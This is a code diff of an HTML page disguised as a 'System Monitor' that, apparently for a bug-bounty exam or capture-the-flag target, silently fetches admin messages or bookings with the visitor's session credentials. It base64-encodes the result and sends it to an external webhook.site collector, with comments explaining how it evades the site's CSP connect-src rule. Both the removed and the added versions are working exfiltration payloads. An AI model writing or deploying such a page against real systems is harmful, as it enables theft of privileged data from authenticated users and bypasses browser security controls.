@@ -1,25 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>System Monitor</title>
+</head>
 <body>
+    <h1>Processing Admin Request...</h1>
     <script>
-        const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
-        const msgId = "69ea47fabee6d6b7c6645a43";
-        const target = `https://api-bugbounty-exam.hashacademy.co/api/admin/messages/${msgId}`;
+        const webhook = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
+        const base = "https://api-bugbounty-exam.hashacademy.co";
 
-        fetch(target, { credentials: "include" })
-            .then(r => r.text())
-            .then(data => {
-                // We use an <img> tag to bypass the connect-src CSP
-                // btoa() encodes the JSON so it fits in a URL
-                new Image().src = `${webh}/leak.png?data=${btoa(data)}`;
-            }).catch(e => {
-                // If the specific message 404s, try the general inbox
-                fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/messages", { credentials: "include" })
-                    .then(r => r.text())
-                    .then(allData => {
-                        new Image().src = `${webh}/inbox.png?data=${btoa(allData)}`;
-                    });
-            });
+        async function exfiltrate() {
+            try {
+                // We fetch the admin bookings where the 'FlagSeeker' car was found
+                const response = await fetch(`${base}/api/admin/bookings`, { credentials: "include" });
+                const data = await response.text();
+                
+                // Use location.replace to bypass CSP 'connect-src'
+                // This sends the data as a Base64 string in the URL
+                window.location.replace(`${webhook}?data=${btoa(data)}`);
+            } catch (e) {
+                // Fallback to stats if bookings fail
+                window.location.replace(`${webhook}?error=${btoa(e.message)}`);
+            }
+        }
+
+        exfiltrate();
     </script>
 </body>
 </html>
